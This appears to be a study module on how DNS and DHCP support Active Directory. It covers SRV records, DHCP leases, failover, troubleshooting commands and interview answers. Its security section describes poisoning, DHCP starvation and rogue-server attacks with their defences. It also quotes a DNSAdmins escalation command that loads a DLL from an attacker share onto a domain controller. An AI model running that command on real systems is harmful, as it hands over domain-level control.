# 05 — DNS & DHCP in Active Directory

> **Section:** 02 — Active Directory (On-Premise)  
> **Difficulty:** Beginner → Intermediate  
> **Depends on:** [01-What-is-AD.md](./01-What-is-AD.md)

---

## 📌 Why DNS Matters So Much in AD

A common misconception: "AD is just about users and passwords."

The reality: **Active Directory cannot function without DNS.**

Every single thing AD does — authentication, locating Domain Controllers, replication, Group Policy — depends on DNS working correctly.

```
When Hareesh's laptop starts up in the morning:

Step 1: Laptop sends DNS query: "_ldap._tcp.company.local"
        "Where is the Domain Controller for company.local?"

Step 2: DNS responds: "DC01 is at 192.168.1.10"

Step 3: Laptop contacts DC01 → Kerberos authentication begins
        → Hareesh logs in ✅

If DNS fails at Step 2:
  → Laptop cannot find DC01
  → Kerberos authentication fails
  → Hareesh cannot log in ❌
  → Group Policy cannot be applied ❌
  → File shares cannot be accessed ❌
  
Active Directory is effectively down — even though DC01 is running perfectly.
```

> **Rule:** Fix DNS first. Everything else in AD troubleshooting comes after.

---

## 🌐 DNS in Active Directory

### What is DNS?

DNS (Domain Name System) translates names to IP addresses.

```
Human-readable: DC01.company.local
Machine-readable: 192.168.1.10

Without DNS:
  Every device would need to know the IP of every other device
  → Unmanageable at scale

With DNS:
  Devices ask "where is DC01.company.local?"
  DNS answers: "192.168.1.10"
  → Device connects using the IP ✅
```

### AD-Integrated DNS

In most environments, DNS runs on the Domain Controllers themselves and is stored in Active Directory (AD-integrated zones).

**Benefits of AD-Integrated DNS:**
```
Traditional DNS (file-based):
  Primary DNS server holds the master copy
  Secondary DNS servers get read-only copies
  If primary goes down → updates fail

AD-Integrated DNS:
  DNS data stored in AD database (NTDS.dit)
  Every DC with DNS role has a full writable copy
  If one DC goes down → other DCs keep DNS running ✅
  Replication handled by AD replication (not zone transfers)
  Secured by AD authentication → only DCs can update records
```

### Key DNS Record Types in AD

| Record Type | Purpose | Example |
|------------|---------|---------|
| **A** | Hostname → IPv4 address | DC01.company.local → 192.168.1.10 |
| **AAAA** | Hostname → IPv6 address | DC01.company.local → ::1 |
| **PTR** | IP → Hostname (reverse lookup) | 192.168.1.10 → DC01.company.local |
| **CNAME** | Alias → another hostname | mail.company.local → exchange01.company.local |
| **MX** | Mail server for domain | company.local → mail.company.local |
| **SRV** | Service location records | _kerberos._tcp.company.local → DC01 |
| **SOA** | Start of Authority (zone info) | Who is authoritative for the zone |
| **NS** | Name Server records | Which servers host the DNS zone |

### SRV Records — How Clients Find AD Services

SRV records are how clients automatically find Domain Controllers, Kerberos servers, and LDAP servers.

```
These SRV records are automatically created when a DC is promoted:

_ldap._tcp.company.local → DC01.company.local:389
  "Find an LDAP server in company.local domain"

_kerberos._tcp.company.local → DC01.company.local:88
  "Find a Kerberos server in company.local domain"

_gc._tcp.company.local → DC01.company.local:3268
  "Find a Global Catalog server"

_kerberos._tcp.dc._msdcs.company.local → DC01.company.local:88
  "Find a Kerberos server that is a DC specifically"

When Hareesh's laptop starts:
  → Queries _ldap._tcp.company.local → gets DC01 address
  → Connects to DC01 on port 389 → LDAP authentication
  → Kerberos ticket obtained → logged in ✅
```

### DNS Zones in AD

```
company.local (Forward Lookup Zone):
  → Translates names → IP addresses
  → Created automatically when AD is set up

1.168.192.in-addr.arpa (Reverse Lookup Zone):
  → Translates IP addresses → names
  → Must be created manually
  → Important for: security tools, authentication, logging
  → Without reverse DNS → some security tools cannot resolve IPs to hostnames

_msdcs.company.local (Microsoft Domain Controller Services zone):
  → Contains SRV records for all AD services
  → Critical — without this zone, clients cannot find DCs
```

---

## 🔧 DNS Management Commands

```powershell
# Check DNS server settings on a machine
Get-DnsClientServerAddress

# Test DNS resolution
Resolve-DnsName "DC01.company.local"
Resolve-DnsName "_ldap._tcp.company.local" -Type SRV

# View all DNS records in a zone
Get-DnsServerResourceRecord -ZoneName "company.local" -ComputerName "DC01"

# Add an A record
Add-DnsServerResourceRecordA -ZoneName "company.local" `
    -Name "WebServer01" -IPv4Address "192.168.1.50" `
    -ComputerName "DC01"

# Check SRV records (AD health)
nslookup
  set type=SRV
  _ldap._tcp.company.local

# Flush DNS cache on workstation
ipconfig /flushdns

# View DNS cache
ipconfig /displaydns

# Check DNS forwarders (for internet resolution)
Get-DnsServerForwarder -ComputerName "DC01"
```

### DNS Troubleshooting Commands

```powershell
# Diagnose DNS issues
dcdiag /test:DNS /v

# Check if SRV records exist (most critical check)
nslookup -type=SRV _ldap._tcp.company.local

# Register machine's DNS records manually
ipconfig /registerdns

# Check what DNS server the machine is using
nslookup
  server    ← shows current DNS server

# Test full name resolution
Test-NetConnection -ComputerName "DC01.company.local" -Port 389
```

---

## 🏠 DHCP in Active Directory

### What is DHCP?

Every device on a network needs an IP address to communicate. DHCP (Dynamic Host Configuration Protocol) automatically assigns IP addresses and network configuration to devices.

```
Without DHCP:
  IT must manually assign:
    → IP address to every device
    → Subnet mask
    → Default gateway
    → DNS server addresses
  
  For 500 devices → 500 manual configurations
  New device added → manual setup required
  IP conflict? → manual investigation

With DHCP:
  Device connects to network:
    → Broadcasts: "I need an IP address!"
    → DHCP server responds: "Take 192.168.1.45 for 8 hours"
    → Device uses it ✅
  
  500 devices → all get IPs automatically ✅
  New device → IP assigned in seconds ✅
  IP conflict → DHCP prevents duplicates ✅
```

### DHCP Lease Process (DORA)

```
D — Discover:
  Hareesh's laptop connects to network
  Broadcasts: "DHCPDISCOVER — I need an IP address"
  (Sent to 255.255.255.255 — everyone on the local network)

O — Offer:
  DHCP server receives the broadcast
  Checks available IP pool
  Responds: "DHCPOFFER — take 192.168.1.45, valid for 8 hours"

R — Request:
  Laptop responds: "DHCPREQUEST — yes, I want 192.168.1.45"
  (Broadcast — tells other DHCP servers the offer was accepted)

A — Acknowledge:
  DHCP server: "DHCPACK — 192.168.1.45 is yours for 8 hours"
  Laptop configures itself with:
    IP: 192.168.1.45
    Subnet: 255.255.255.0
    Gateway: 192.168.1.1
    DNS: 192.168.1.10 (DC01), 192.168.1.11 (DC02)
```

### DHCP Scope — The IP Pool

A DHCP scope is the range of IP addresses available for assignment.

```
Scope: "Office Network"
  Subnet: 192.168.1.0 /24
  Range: 192.168.1.50 → 192.168.1.200  ← IPs available to assign
  
  Exclusions:
    192.168.1.1    ← Router/Gateway (static — excluded from scope)
    192.168.1.10   ← DC01 (static)
    192.168.1.11   ← DC02 (static)
    192.168.1.20   ← FileServer01 (static)
  
  Reservations (always same IP for specific device):
    Hareesh's laptop (MAC: AA:BB:CC:DD:EE:FF) → always gets 192.168.1.55
    GP's laptop (MAC: 11:22:33:44:55:66) → always gets 192.168.1.56
  
  Lease duration: 8 hours (workstations)
                  7 days (servers — change IP less often)
  
  Options (sent with every lease):
    003 Router: 192.168.1.1
    006 DNS Servers: 192.168.1.10, 192.168.1.11
    015 Domain Name: company.local
```

### DHCP in Active Directory — Authorisation

Windows DHCP servers must be **authorised** in Active Directory before they can hand out leases.

```
Why authorisation exists:
  Someone plugs a rogue DHCP server into the network
  Rogue server starts handing out wrong DNS addresses
  → Clients get wrong DNS → cannot find DC → AD broken
  → Or get attacker's DNS → DNS poisoning attack

With DHCP authorisation:
  Only DHCP servers registered in AD can respond to clients
  Rogue DHCP server: broadcasts an offer
  Authorised server: detects the rogue → shuts it down
  
  Authorise a DHCP server:
  Open DHCP console → right-click server → Authorize
  OR: Add-DhcpServerInDC -DnsName "DC01.company.local"
```

### DHCP Failover

Single DHCP server = single point of failure. DHCP Failover allows two DHCP servers to share a scope.

```
Primary DHCP: DC01 (active — handles requests)
Secondary DHCP: DC02 (standby — takes over if DC01 fails)

Modes:
  Hot Standby: One server active, one passive backup
  Load Sharing: Both servers share 50/50 of the scope

Configure failover:
  Add-DhcpServerv4Failover `
    -Name "DC01-DC02-Failover" `
    -PartnerServer "DC02.company.local" `
    -ScopeId 192.168.1.0 `
    -Mode HotStandby `
    -ServerRole Active
```

---

## 🔗 DNS and DHCP Working Together

### Dynamic DNS Updates (DDNS)

When DHCP assigns an IP to a machine, it automatically updates DNS records.

```
Hareesh's laptop gets IP 192.168.1.45 from DHCP:
  DHCP server automatically updates DNS:
    A record: LAPTOP-HR-001.company.local → 192.168.1.45
    PTR record: 192.168.1.45 → LAPTOP-HR-001.company.local

  Other machines can now find Hareesh's laptop by name:
    ping LAPTOP-HR-001.company.local → resolves to 192.168.1.45 ✅

DHCP lease expires, laptop gets new IP 192.168.1.46:
  DNS automatically updated:
    Old A record removed, new one created ✅
```

---

## ⚠️ Security Risks

### 1. DNS Poisoning / Spoofing
```
What: Attacker injects false DNS records
Example:
  Attacker poisons DNS: dc01.company.local → attacker's IP
  All machines think attacker's machine is DC01
  → Authentication requests go to attacker
  → Attacker captures credentials (NTLM relay)

Defense:
  Use AD-integrated DNS (only DCs can update records)
  Enable DNSSEC for external DNS
  Monitor DNS record changes
```

### 2. DHCP Starvation Attack
```
What: Attacker requests all available IPs from DHCP scope
Tool: Yersinia, gobbler
Example:
  Attacker sends thousands of fake DHCPDISCOVER requests
  All IPs in the scope get allocated to fake MAC addresses
  Legitimate devices cannot get IP addresses → network outage

Defense:
  DHCP snooping on network switches (validates DHCP requests)
  Port security (limit MACs per port)
  Monitor for unusual DHCP request volumes
```

### 3. Rogue DHCP Server
```
What: Attacker runs an unauthorised DHCP server
Example:
  Attacker's DHCP server sends:
    IP: 192.168.1.x (legitimate)
    DNS: attacker's DNS server ← poisoned
  Clients use attacker's DNS
  → All DNS queries go to attacker
  → Attacker redirects company.local to fake servers

Defense:
  DHCP authorisation in AD
  DHCP snooping on switches
  Monitor for multiple DHCP offers in network traffic
```

### 4. DNS Admin Privilege Escalation
```
What: DNSAdmins group members can load a DLL on the DNS server
Example:
  Attacker gets Hareesh added to DNSAdmins (via social engineering)
  Runs: dnscmd DC01 /config /serverlevelplugindll \\attacker\malicious.dll
  DNS service restarted → DLL loads as SYSTEM
  DNS server = DC → SYSTEM on DC = Domain Admin level access

Defense:
  Keep DNSAdmins group empty — use temporary delegation only
  Monitor additions to DNSAdmins (Event ID 4728)
  Alert on dnscmd usage in process logs
```

---

## 🔧 Troubleshooting

### AD Cannot Find Domain Controller

```powershell
# Step 1: Check DNS resolution
nslookup company.local

# Step 2: Check SRV records exist
nslookup
  set type=SRV
  _ldap._tcp.company.local

# Step 3: Check DC is reachable
Test-NetConnection -ComputerName "DC01.company.local" -Port 389

# Step 4: Check DNS client settings
Get-DnsClientServerAddress
# Should point to DC IP (192.168.1.10) — NOT 8.8.8.8 or router

# Step 5: Re-register DNS records
ipconfig /registerdns

# Step 6: Full AD DNS health check
dcdiag /test:DNS /v /f:c:\dcdiag.log
```

### DHCP Not Assigning IPs

```powershell
# Check DHCP server is running
Get-Service -Name DHCPServer

# Check scope is active
Get-DhcpServerv4Scope -ComputerName "DC01"

# Check available IPs in scope
Get-DhcpServerv4ScopeStatistics -ComputerName "DC01"
# If "Free" = 0 → scope exhausted → expand range or shorten lease time

# Check DHCP is authorised
Get-DhcpServerInDC

# Check for IP conflicts
Get-DhcpServerv4Lease -ComputerName "DC01" -ScopeId 192.168.1.0 |
    Where-Object {$_.AddressState -eq "ActiveReservation"}
```

---

## 🎯 Interview Questions

**Q1. Why does Active Directory depend on DNS?**  
**A:** Active Directory uses DNS SRV records to locate Domain Controllers, Kerberos servers, and LDAP servers. When a client machine starts up, it queries DNS for SRV records like _ldap._tcp.domain.local to find the Domain Controller's IP address. Without DNS working correctly, clients cannot find DCs, authentication fails, Group Policy cannot be applied, and AD replication can break. DNS is the navigation system of Active Directory — everything else depends on it.

---

**Q2. What is DHCP and how does the DORA process work?**  
**A:** DHCP automatically assigns IP addresses and network configuration to devices. The DORA process: Discover (client broadcasts asking for an IP), Offer (DHCP server offers an available IP), Request (client requests the offered IP), Acknowledge (server confirms the lease). The device then configures itself with the assigned IP, subnet mask, default gateway, and DNS server addresses provided in the lease options.

---

**Q3. What is DHCP authorisation in Active Directory and why does it matter?**  
**A:** DHCP authorisation requires DHCP servers to be registered in Active Directory before they can hand out IP leases. This prevents rogue DHCP servers — if an unauthorised DHCP server appears on the network (accidentally set up or maliciously placed), the authorised DHCP server detects it and the rogue server shuts down. Without this control, a rogue DHCP server could hand out incorrect DNS addresses, redirecting clients to attacker-controlled servers.

---

**Q4. What DNS record type is most critical for Active Directory and why?**  
**A:** SRV (Service) records are most critical. AD automatically creates SRV records like _ldap._tcp.domain.local and _kerberos._tcp.domain.local when a DC is promoted. These records tell client machines where to find Domain Controllers, Kerberos authentication servers, and Global Catalog servers. Without these SRV records, clients cannot locate DCs and Active Directory authentication completely fails. This is why dcdiag /test:DNS specifically checks for SRV record health.

---

**Q5. Scenario — Monday morning, all users report they cannot log into their computers. The Domain Controllers appear to be running. What is your first troubleshooting step?**  
**A:** Check DNS first — always. Run nslookup company.local from a workstation. If DNS resolution fails, users cannot find the Domain Controller regardless of whether it is running. Check: (1) Is the DNS service running on the DC? (2) Are workstations pointing to the DC's IP for DNS (not 8.8.8.8 or the router)? (3) Do SRV records exist — nslookup -type=SRV _ldap._tcp.company.local? (4) Was any network change made over the weekend (firewall rule blocking port 53, DHCP handing out wrong DNS server)? A DNS failure can make a healthy AD environment look completely broken.

---

*"In Active Directory troubleshooting, there is one rule above all others: fix DNS first. If DNS is broken, everything else is broken. If DNS is working, you can find the real problem."*
